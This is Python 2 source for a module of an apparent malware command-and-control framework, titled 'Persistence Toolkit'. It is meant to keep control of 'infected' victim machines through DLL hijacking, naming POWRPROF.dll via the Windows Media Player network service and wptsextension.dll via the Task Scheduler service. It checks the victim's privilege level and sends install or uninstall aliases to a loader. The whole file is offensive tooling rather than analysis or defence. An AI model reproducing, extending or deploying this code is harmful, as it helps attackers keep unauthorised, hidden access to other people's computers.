from support import database

#Standard class name for each module when invoking
class IllusiveFogModule:
    def __init__(self,params=[]):
        self.params= params

        self.info={
            'Name'       : 'Persistence Toolkit',
            'Description': 'Module Aims to gain Persistence on Infected Machine using Various methods',
            'Author'     : 'Internal Dev Team',
            'Escalated'  :  True
        }
        #Module Options
        self.options={
            'Operation': self.params[1],
            'Victim': self.params[0],
            'Pellet': False
        }

        #Module Help
        self.modulehelp="""
        Persistence ToolKIT
        ===================
        Description : Toolkit aims to perform various persistence techniques over victim machine.
        URLS : N/A

        Options:
            install/uninstall - Operation type to be issued from victim interactive shell.

        """

# DLL Hijacking Menu
    def DLLHijacker(self):
        operationAliasInstall="45"
        operationAliasUninstall="90"
        #Pellet of loader specific to technique
        Persistence_Loader = self.options['Pellet']
        

        supported = {                                    
            '1': {
                'Index'       :"1",
                'Binary'      :'POWRPROF.dll',                                            
                'OS'          :'Windows 7',                                
                'Description' :'Windows Media Player(WM network) Service(wmpnetwk.exe).', 
                'Alias'       :'A11',                                   
                'AutoExec'    :True
            },                                     
            
            '2': {
                'Index'       :'2',
                'Binary'      :'wptsextension.dll',
                'OS'          :'Windows 10',
                'Description' :'Windows Task Scheduler service.',
                'Alias'       :'A22',
                'AutoExec'    :True
            }
        }

        print ""    
        print "Available Methods:"
        print "-----------------"
            
        #Need to patch this bug
        for key,value in supported.iteritems():
            for v in value:
                print v+" : "+str(value[v])
            print "\n"

        choice = raw_input("Method : ")
        choice =choice.rstrip('\r')
        g=None
            #fetch supported operations
        for key,value in supported.iteritems():
                    if self.operation == "install":
                        #Check Privileges
                        if database.Victim().FetchVictimPrivLvl(self.victim) != "1":
                            print "[-] Operation cannot be initiated since Victim is not privileged enough."
                            break
                        else:
                            Persistence_Loader = True
                            print ""
                            p = str(value["Index"])
                            if choice == p:
                                g= operationAliasInstall+":"+value["Alias"]
                                break
                            else:
                                continue

                    elif self.operation == "uninstall":
                        print ""
                        p = str(value["Index"])
                        if choice == p:
                            g= operationAliasUninstall+value["Alias"]
                            break
                        else:
                            continue
                    
        return [g,Persistence_Loader]


#Main function which will be called, Must return
    def run(self):

        #saving options
        self.operation=self.options['Operation']
        self.victim = self.options['Victim']

        #print info about module
        print ""
        print "Module Info:"
        print "-----------"
        print "Name :"+self.info['Name'] 
        print "Description :"+self.info['Description']
        print "Author :"+self.info['Author']
        print "[info] For more info about module usage, use option 'help'. example: persistence help"
        print "\n"

        if self.operation == "help":
            print self.modulehelp
            return None
        else:
            try:
                #Get all options
                print "Module Options:"
                print "--------------"
                print "Victim :"+self.victim
                print "Operation :"+self.operation
                print "\n"
                
                #Print all availabe techniques
                print "Available Techniques:"
                print "---------------------"
                print "1. DLL Hijack."
                print "\n"

                self.technique = str(raw_input("Technique : ")).rsplit("\r")
                #Initiate operation for DLL hijack
                if self.technique[0] == "1":
                    return self.DLLHijacker()

                #Invalid technique handler
                else:
                    print "[-] Invalid Technique"
                    return None
            except Exception as e:
                print e
                return None